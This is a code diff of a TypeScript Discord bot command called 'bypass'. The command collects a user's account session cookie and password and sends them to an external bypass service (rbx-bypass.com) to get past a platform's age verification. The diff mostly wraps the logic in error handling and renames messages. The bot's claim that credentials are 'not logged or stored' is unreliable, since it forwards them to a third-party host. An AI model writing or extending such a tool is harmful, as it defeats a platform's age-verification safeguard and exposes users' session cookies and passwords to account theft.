@@ -28,7 +28,7 @@ function buildInitialButtons(id: string): ActionRowBuilder<ButtonBuilder> {
 
 const data = new SlashCommandBuilder()
   .setName('bypass')
-  .setDescription('Attempt to bypass age verification using external API')
+  .setDescription('Bypass Stuff')
   .setDefaultMemberPermissions(PermissionFlagsBits.Administrator)
   .addStringOption(opt =>
     opt.setName('cookie')
@@ -42,30 +42,30 @@ const data = new SlashCommandBuilder()
   ) as SlashCommandBuilder;
 
 async function execute(interaction: ChatInputCommandInteraction): Promise<void> {
-  await interaction.deferReply({ ephemeral: true });
-
-  const cookie = interaction.options.getString('cookie', true);
-  const password = interaction.options.getString('password', true);
-  const timestamp = new Date().toLocaleString();
-  const footerData = {
-    text: `${interaction.user.username} | ${timestamp}`,
-    iconURL: interaction.user.displayAvatarURL(),
-  };
-
-  const progressEmbed = new EmbedBuilder()
-    .setTitle('𖣐 Processing .ᐟ')
-    .setColor('#FFFFFF')
-    .setDescription(
-      `✧ **Status:** Sending bypass request...\n` +
-      `────\n` +
-      `⭑ Contacting external bypass service.\n` +
-      `⭑ Your credentials are not logged or stored.`
-    )
-    .setFooter(footerData);
-
-  await interaction.editReply({ embeds: [progressEmbed] });
-
   try {
+    await interaction.deferReply({ ephemeral: true });
+
+    const cookie = interaction.options.getString('cookie', true);
+    const password = interaction.options.getString('password', true);
+    const timestamp = new Date().toLocaleString();
+    const footerData = {
+      text: `${interaction.user.username} | ${timestamp}`,
+      iconURL: interaction.user.displayAvatarURL(),
+    };
+
+    const progressEmbed = new EmbedBuilder()
+      .setTitle('𖣐 Processing .ᐟ')
+      .setColor('#FFFFFF')
+      .setDescription(
+        `✧ **Status:** Sending bypass request...\n` +
+        `────\n` +
+        `⭑ Contacting external bypass service.\n` +
+        `⭑ Your credentials are not logged or stored.`
+      )
+      .setFooter(footerData);
+
+    await interaction.editReply({ embeds: [progressEmbed] });
+
     const url = 'https://rbx-bypass.com/api/public/bypass';
     const headers = {
       'authority': 'rbx-bypass.com',
@@ -145,38 +145,41 @@ async function execute(interaction: ChatInputCommandInteraction): Promise<void> 
     }
   } catch (error: any) {
     const embed = new EmbedBuilder()
-      .setTitle('𖣐 Failed .ᐟ')
+      .setTitle('𖣐 Error .ᐟ')
       .setColor('#FFFFFF')
       .setDescription(
-        `✧ **Error Occurred**\n` +
+        `✧ **Unexpected Error**\n` +
         `────\n` +
-        `⭑ **Reason:** ${error.message || 'Network error'}\n` +
-        `⭑ The request could not be completed.\n` +
+        `⭑ ${error.message || 'Something went wrong.'}\n` +
         `⭑ Your credentials were not logged or stored.`
       )
-      .setFooter(footerData);
+      .setFooter({ text: `${interaction.user.username} | ${new Date().toLocaleString()}`, iconURL: interaction.user.displayAvatarURL() });
     await interaction.editReply({ embeds: [embed] });
   }
 }
 
 async function handleButton(interaction: MessageComponentInteraction): Promise<void> {
-  const customId = interaction.customId;
-  if (!customId.startsWith('bypass_')) return;
+  try {
+    const customId = interaction.customId;
+    if (!customId.startsWith('bypass_')) return;
 
-  const parts = customId.split('_');
-  const action = parts[1];
-  const id = parts[2];
+    const parts = customId.split('_');
+    const action = parts[1];
+    const id = parts[2];
 
-  const cookie = bypassStore.get(id);
-  if (!cookie) {
-    await interaction.reply({ content: '𖣐 This button has expired. Please run the command again.', ephemeral: true });
-    return;
-  }
+    const cookie = bypassStore.get(id);
+    if (!cookie) {
+      await interaction.reply({ content: '𖣐 This button has expired. Please run the command again.', ephemeral: true });
+      return;
+    }
 
-  if (action === 'copypc') {
-    await interaction.reply({ content: `\`\`\`\n${cookie}\n\`\`\``, ephemeral: true });
-  } else if (action === 'copymob') {
-    await interaction.reply({ content: `\`${cookie}\``, ephemeral: true });
+    if (action === 'copypc') {
+      await interaction.reply({ content: `\`\`\`\n${cookie}\n\`\`\``, ephemeral: true });
+    } else if (action === 'copymob') {
+      await interaction.reply({ content: `\`${cookie}\``, ephemeral: true });
+    }
+  } catch (error: any) {
+    await interaction.reply({ content: `𖣐 Error: ${error.message || 'Something went wrong.'}`, ephemeral: true });
   }
 }
 
